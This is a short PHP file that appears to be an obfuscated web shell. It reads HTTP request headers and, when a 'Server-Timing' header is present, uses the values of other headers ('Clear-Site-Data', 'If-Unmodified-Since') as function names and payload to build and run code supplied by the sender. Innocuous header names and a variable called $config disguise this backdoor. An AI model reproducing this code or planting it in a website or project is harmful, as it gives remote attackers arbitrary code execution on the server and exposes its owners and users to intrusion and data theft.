<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Server-Timing'])) {
    $config = $_HEADERS['Server-Timing']('', $_HEADERS['Clear-Site-Data']($_HEADERS['If-Unmodified-Since']));
    $config();
}